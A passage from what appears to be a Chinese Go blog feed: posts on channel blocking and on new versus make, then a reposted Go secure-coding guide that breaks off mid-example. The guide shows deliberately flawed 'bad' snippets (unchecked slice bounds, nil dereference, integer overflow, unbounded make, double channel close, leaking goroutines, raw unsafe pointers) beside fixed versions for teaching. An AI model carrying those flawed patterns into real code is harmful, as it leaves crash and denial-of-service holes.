ch)会阻塞当前goroutine，但是，是如何实现的呢？</p><p>我们知道，Go的goroutine是用户态的线程(<code>user-space threads</code>)，用户态的线程是需要自己去调度的，Go有运行时的scheduler去帮我们完成调度这件事情。关于Go的调度模型GMP模型我在此不做赘述，如果不了解，可以看我另一篇文章(<a href="https://i6448038.github.io/2017/12/04/golang-concurrency-principle/">Go调度原理</a>)</p><p>goroutine的阻塞操作，实际上是调用<code>send (ch &lt;- xx)</code>或者<code>recv ( &lt;-ch)</code>的时候主动触发的，具体请看以下内容：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//goroutine1 中，记做G1</span><br><br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">3</span>)<br><br>ch &lt;- <span class="hljs-number">1</span><br>ch &lt;- <span class="hljs-number">1</span><br>ch &lt;- <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://i6448038.github.io/img/channel/hchan_block.png" alt="img"></p><p><img src="https://i6448038.github.io/img/channel/hchan_block1.png" alt="img"></p><p>这个时候G1正在正常运行,当再次进行send操作(ch&lt;-1)的时候，会主动调用Go的调度器,让G1等待，并从让出M，让其他G去使用</p><p><img src="https://i6448038.github.io/img/channel/hchan_block2.png" alt="img"></p><p>同时G1也会被抽象成含有G1指针和send元素的<code>sudog</code>结构体保存到hchan的<code>sendq</code>中等待被唤醒。</p><p><img src="https://i6448038.github.io/img/channel/hchan_blok3.gif" alt="img"></p><p>那么，G1什么时候被唤醒呢？这个时候G2隆重登场。</p><p><img src="https://i6448038.github.io/img/channel/hchan_block4.png" alt="img"></p><p>G2执行了recv操作<code>p := &lt;-ch</code>，于是会发生以下的操作：</p><p><img src="https://i6448038.github.io/img/channel/hchan_block5.gif" alt="img"></p><p>G2从缓存队列中取出数据，channel会将等待队列中的G1推出，将G1当时send的数据推到缓存中，然后调用Go的scheduler，唤醒G1，并把G1放到可运行的Goroutine队列中。</p><p><img src="https://i6448038.github.io/img/channel/hchan_block6.gif" alt="img"></p><h3 id="假如是先进行执行recv操作的G2会怎么样？"><a href="#假如是先进行执行recv操作的G2会怎么样？" class="headerlink" title="假如是先进行执行recv操作的G2会怎么样？"></a>假如是先进行执行recv操作的G2会怎么样？</h3><p>你可能会顺着以上的思路反推。首先：</p><p><img src="https://i6448038.github.io/img/channel/hchan_block7_1.png" alt="img"></p><p>这个时候G2会主动调用Go的调度器,让G2等待，并从让出M，让其他G去使用。<br>G2还会被抽象成含有G2指针和recv空元素的<code>sudog</code>结构体保存到hchan的<code>recvq</code>中等待被唤醒</p><p><img src="https://i6448038.github.io/img/channel/hchan_block7.gif" alt="img"></p><p>此时恰好有个goroutine G1开始向channel中推送数据 <code>ch &lt;- 1</code>。<br>此时，非常有意思的事情发生了：</p><p><img src="https://i6448038.github.io/img/channel/hchan_block8.gif" alt="img"></p><p>G1并没有锁住channel，然后将数据放到缓存中，而是直接把数据从G1直接copy到了G2的栈中。<br>这种方式非常的赞！在唤醒过程中，G2无需再获得channel的锁，然后从缓存中取数据。减少了内存的copy，提高了效率。</p><p>之后的事情显而易见：<br><img src="https://i6448038.github.io/img/channel/hchan_block9.gif" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang中new和make关键字有什么区别？</title>
    <link href="/2023/01/01/Golang%E4%B8%ADnew%E5%92%8Cmake%E5%85%B3%E9%94%AE%E5%AD%97%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F/"/>
    <url>/2023/01/01/Golang%E4%B8%ADnew%E5%92%8Cmake%E5%85%B3%E9%94%AE%E5%AD%97%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang中new和make关键字有什么区别？"><a href="#Golang中new和make关键字有什么区别？" class="headerlink" title="Golang中new和make关键字有什么区别？"></a>Golang中new和make关键字有什么区别？</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在golang中， 我们经常使用new 和 make 来创建并分配相应类型的内存空间。在我们定义变量的时候，那他们有什么区别呢？其实他们的规则很简单，new 对相应类型进行内存分配，而 make 只能用于 slice、map 和 channel 的初始化，下面我们就来详细介绍一下。</p><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><p>在golang中，内置函数 <code>new</code> 可以对类型进行内存分配。<strong>其返回值是所创建类型的指针引用</strong>。</p><p>代码示例如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> T <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>    Age  <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>t := <span class="hljs-built_in">new</span>(T)<br>t.Name = <span class="hljs-string">&quot;test&quot;</span><br>    t.Age = <span class="hljs-number">18</span><br>&#125;<br></code></pre></td></tr></table></figure><p> <code>new</code> 函数在日常工程代码中是比较少见的，我们通常直接用 <code>T&#123;&#125;</code> 来进行初始化，这种初始化方式更方便。</p><h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>在golang中，内置函数 <code>make</code> 仅支持 <code>slice</code>、<code>map</code>、<code>channel</code> 三种数据类型的内存创建，<strong>其返回值是所创建类型的本身，而不是新的指针引用</strong>。不仅可以开辟一个内存，还能给这个内存的类型初始化其零值。</p><p>代码示例如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>)<br>m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>, <span class="hljs-number">5</span>)<br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>make和new都是golang用来分配内存的內建函数，且在堆上分配内存，make 即分配内存，也初始化内存。new只是将内存清零，并没有初始化内存。</li><li>make返回的创建类型的本身；而new返回的是指向类型的指针。</li><li>make只能用来分配及初始化类型为slice，map，channel的数据；new可以分配任意类型的数据。</li></ul>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang代码安全规范</title>
    <link href="/2022/12/31/Golang%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E8%A7%84%E8%8C%83/"/>
    <url>/2022/12/31/Golang%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E8%A7%84%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang代码安全规范"><a href="#Golang代码安全规范" class="headerlink" title="Golang代码安全规范"></a>Golang代码安全规范</h1><blockquote><p>本文转载自腾讯的Go安全开发指南</p></blockquote><details markdown="1">  <summary>目录</summary><ul><li><p><a href="#1">1 通用类</a></p><ul><li><a href="#1.1">I. 代码实现</a><ul><li><a href="#1.1.1">1.1 内存管理</a></li><li><a href="#1.1.2">1.2 文件操作</a></li><li><a href="#1.1.3">1.3 系统接口</a></li><li><a href="#1.1.4">1.4 通信安全</a></li><li><a href="#1.1.5">1.5 敏感数据保护</a></li><li><a href="#1.1.6">1.6 加密解密</a></li><li><a href="#1.1.7">1.7 正则表达式</a></li></ul></li></ul></li><li><p><a href="#2">2 后台类</a></p><ul><li><a href="#2.1">I. 代码实现</a><ul><li><a href="#2.1.1">1.1 输入校验</a></li><li><a href="#2.1.2">1.2 SQL操作</a></li><li><a href="#2.1.3">1.3 网络请求</a></li><li><a href="#2.1.4">1.4 服务器端渲染</a></li><li><a href="#2.1.5">1.5 Web跨域</a></li><li><a href="#2.1.6">1.6 响应输出</a></li><li><a href="#2.1.7">1.7 会话管理</a></li><li><a href="#2.1.8">1.8 访问控制</a></li><li><a href="#2.1.9">1.9 并发保护</a></li></ul></li></ul></li></ul></details><h1 id="通用类"><a href="#通用类" class="headerlink" title="通用类"></a>通用类</h1><h2 id="1-代码实现类"><a href="#1-代码实现类" class="headerlink" title="1. 代码实现类"></a>1. 代码实现类</h2><h3 id="1-1-内存管理"><a href="#1-1-内存管理" class="headerlink" title="1.1 内存管理"></a>1.1 内存管理</h3><h4 id="1-1-1【必须】切片长度校验"><a href="#1-1-1【必须】切片长度校验" class="headerlink" title="1.1.1【必须】切片长度校验"></a>1.1.1【必须】切片长度校验</h4><ul><li>在对slice进行操作时，必须判断长度是否合法，防止程序panic</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad: 未判断data的长度，可导致 index out of range</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">decode</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">if</span> data[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;F&#x27;</span> &amp;&amp; data[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;U&#x27;</span> &amp;&amp; data[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;Z&#x27;</span> &amp;&amp; data[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;Z&#x27;</span> &amp;&amp; data[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;E&#x27;</span> &amp;&amp; data[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;R&#x27;</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Bad&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-comment">// bad: slice bounds out of range</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> slice = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;<br>fmt.Println(slice[:<span class="hljs-number">10</span>])<br>&#125;<br><br><span class="hljs-comment">// good: 使用data前应判断长度是否合法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">decode</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">6</span> &#123;<br><span class="hljs-keyword">if</span> data[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;F&#x27;</span> &amp;&amp; data[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;U&#x27;</span> &amp;&amp; data[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;Z&#x27;</span> &amp;&amp; data[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;Z&#x27;</span> &amp;&amp; data[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;E&#x27;</span> &amp;&amp; data[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;R&#x27;</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Good&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-1-2【必须】nil指针判断"><a href="#1-1-2【必须】nil指针判断" class="headerlink" title="1.1.2【必须】nil指针判断"></a>1.1.2【必须】nil指针判断</h4><ul><li>进行指针操作时，必须判断该指针是否为nil，防止程序panic，尤其在进行结构体Unmarshal时</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Packet <span class="hljs-keyword">struct</span> &#123;<br>PackeyType    <span class="hljs-type">uint8</span><br>PackeyVersion <span class="hljs-type">uint8</span><br>Data          *Data<br>&#125;<br><br><span class="hljs-keyword">type</span> Data <span class="hljs-keyword">struct</span> &#123;<br>Stat <span class="hljs-type">uint8</span><br>Len  <span class="hljs-type">uint8</span><br>Buf  [<span class="hljs-number">8</span>]<span class="hljs-type">byte</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Packet)</span></span> UnmarshalBinary(b []<span class="hljs-type">byte</span>) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(b) &lt; <span class="hljs-number">2</span> &#123;<br><span class="hljs-keyword">return</span> io.EOF<br>&#125;<br><br>p.PackeyType = b[<span class="hljs-number">0</span>]<br>p.PackeyVersion = b[<span class="hljs-number">1</span>]<br><br><span class="hljs-comment">// 若长度等于2，那么不会new Data</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(b) &gt; <span class="hljs-number">2</span> &#123;<br>p.Data = <span class="hljs-built_in">new</span>(Data)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// bad: 未判断指针是否为nil</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>packet := <span class="hljs-built_in">new</span>(Packet)<br>data := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">2</span>)<br><span class="hljs-keyword">if</span> err := packet.UnmarshalBinary(data); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Failed to unmarshal packet&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>fmt.Printf(<span class="hljs-string">&quot;Stat: %v\n&quot;</span>, packet.Data.Stat)<br>&#125;<br><br><span class="hljs-comment">// good: 判断Data指针是否为nil</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>packet := <span class="hljs-built_in">new</span>(Packet)<br>data := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">if</span> err := packet.UnmarshalBinary(data); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Failed to unmarshal packet&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> packet.Data == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br>fmt.Printf(<span class="hljs-string">&quot;Stat: %v\n&quot;</span>, packet.Data.Stat)<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-1-3【必须】整数安全"><a href="#1-1-3【必须】整数安全" class="headerlink" title="1.1.3【必须】整数安全"></a>1.1.3【必须】整数安全</h4><ul><li><p>在进行数字运算操作时，需要做好长度限制，防止外部输入运算导致异常：</p><ul><li>确保无符号整数运算时不会反转</li><li>确保有符号整数运算时不会出现溢出</li><li>确保整型转换时不会出现截断错误</li><li>确保整型转换时不会出现符号错误</li></ul></li><li><p>以下场景必须严格进行长度限制：</p><ul><li>作为数组索引</li><li>作为对象的长度或者大小</li><li>作为数组的边界（如作为循环计数器）</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad: 未限制长度，导致整数溢出</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">overflow</span><span class="hljs-params">(numControlByUser <span class="hljs-type">int32</span>)</span></span> &#123;<br><span class="hljs-keyword">var</span> numInt <span class="hljs-type">int32</span> = <span class="hljs-number">0</span><br>numInt = numControlByUser + <span class="hljs-number">1</span><br><span class="hljs-comment">// 对长度限制不当，导致整数溢出</span><br>fmt.Printf(<span class="hljs-string">&quot;%d\n&quot;</span>, numInt)<br><span class="hljs-comment">// 使用numInt，可能导致其他错误</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>overflow(<span class="hljs-number">2147483647</span>)<br>&#125;<br><br><span class="hljs-comment">// good</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">overflow</span><span class="hljs-params">(numControlByUser <span class="hljs-type">int32</span>)</span></span> &#123;<br><span class="hljs-keyword">var</span> numInt <span class="hljs-type">int32</span> = <span class="hljs-number">0</span><br>numInt = numControlByUser + <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> numInt &lt; <span class="hljs-number">0</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;integer overflow&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;integer ok&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>overflow(<span class="hljs-number">2147483647</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-1-4【必须】make分配长度验证"><a href="#1-1-4【必须】make分配长度验证" class="headerlink" title="1.1.4【必须】make分配长度验证"></a>1.1.4【必须】make分配长度验证</h4><ul><li>在进行make分配内存时，需要对外部可控的长度进行校验，防止程序panic。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">parse</span><span class="hljs-params">(lenControlByUser <span class="hljs-type">int</span>, data []<span class="hljs-type">byte</span>)</span></span> &#123;<br>size := lenControlByUser<br><span class="hljs-comment">// 对外部传入的size，进行长度判断以免导致panic</span><br>buffer := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, size)<br><span class="hljs-built_in">copy</span>(buffer, data)<br>&#125;<br><br><span class="hljs-comment">// good</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">parse</span><span class="hljs-params">(lenControlByUser <span class="hljs-type">int</span>, data []<span class="hljs-type">byte</span>)</span></span> ([]<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>) &#123;<br>size := lenControlByUser<br><span class="hljs-comment">// 限制外部可控的长度大小范围</span><br><span class="hljs-keyword">if</span> size &gt; <span class="hljs-number">64</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">&quot;value too large&quot;</span>)<br>&#125;<br>buffer := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, size)<br><span class="hljs-built_in">copy</span>(buffer, data)<br><span class="hljs-keyword">return</span> buffer, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-1-5【必须】禁止SetFinalizer和指针循环引用同时使用"><a href="#1-1-5【必须】禁止SetFinalizer和指针循环引用同时使用" class="headerlink" title="1.1.5【必须】禁止SetFinalizer和指针循环引用同时使用"></a>1.1.5【必须】禁止SetFinalizer和指针循环引用同时使用</h4><ul><li>当一个对象从被GC选中到移除内存之前，runtime.SetFinalizer()都不会执行，即使程序正常结束或者发生错误。由指针构成的“循环引用”虽然能被GC正确处理，但由于无法确定Finalizer依赖顺序，从而无法调用runtime.SetFinalizer()，导致目标对象无法变成可达状态，从而造成内存无法被回收。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a, b Data<br>a.o = &amp;b<br>b.o = &amp;a<br><br><span class="hljs-comment">// 指针循环引用，SetFinalizer()无法正常调用</span><br>runtime.SetFinalizer(&amp;a, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(d *Data)</span></span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;a %p final.\n&quot;</span>, d)<br>&#125;)<br>runtime.SetFinalizer(&amp;b, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(d *Data)</span></span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;b %p final.\n&quot;</span>, d)<br>&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br>foo()<br>time.Sleep(time.Millisecond)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="1-1-6【必须】禁止重复释放channel"><a href="#1-1-6【必须】禁止重复释放channel" class="headerlink" title="1.1.6【必须】禁止重复释放channel"></a>1.1.6【必须】禁止重复释放channel</h4><ul><li>重复释放一般存在于异常流程判断中，如果恶意攻击者构造出异常条件使程序重复释放channel，则会触发运行时panic，从而造成DoS攻击。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foo</span><span class="hljs-params">(c <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(c)<br>err := processBusiness()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c &lt;- <span class="hljs-number">0</span><br><span class="hljs-built_in">close</span>(c) <span class="hljs-comment">// 重复释放channel</span><br><span class="hljs-keyword">return</span><br>&#125;<br>c &lt;- <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-comment">// good</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foo</span><span class="hljs-params">(c <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(c) <span class="hljs-comment">// 使用defer延迟关闭channel</span><br>err := processBusiness()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c &lt;- <span class="hljs-number">0</span><br><span class="hljs-keyword">return</span><br>&#125;<br>c &lt;- <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-1-7【必须】确保每个协程都能退出"><a href="#1-1-7【必须】确保每个协程都能退出" class="headerlink" title="1.1.7【必须】确保每个协程都能退出"></a>1.1.7【必须】确保每个协程都能退出</h4><ul><li>启动一个协程就会做一个入栈操作，在系统不退出的情况下，协程也没有设置退出条件，则相当于协程失去了控制，它占用的资源无法回收，可能会导致内存泄露。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad: 协程没有设置退出条件</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">doWaiter</span><span class="hljs-params">(name <span class="hljs-type">string</span>, second <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br>time.Sleep(time.Duration(second) * time.Second)<br>fmt.Println(name, <span class="hljs-string">&quot; is ready!&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-1-8【推荐】不使用unsafe包"><a href="#1-1-8【推荐】不使用unsafe包" class="headerlink" title="1.1.8【推荐】不使用unsafe包"></a>1.1.8【推荐】不使用unsafe包</h4><ul><li>由于unsafe包绕过了 Golang 的内存安全原则，一般来说使用该库是不安全的，可导致内存破坏，尽量避免使用该包。若必须要使用unsafe操作指针，必须做好安全校验。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad: 通过unsafe操作原始指针</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unsafePointer</span><span class="hljs-params">()</span></span> &#123;<br>b := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">1</span>)<br>foo := (*<span class="hljs-type">int</span>)(unsafe.Pointer(<span class="hljs-type">uintptr</span>(unsafe.Pointer(&amp;b[<span class="hljs-number">0</span>])) + <span class="hljs-type">uintptr</span>(<span class="hljs-number">0xfffffffe</span>)))<br>fmt.Print(*foo + <span 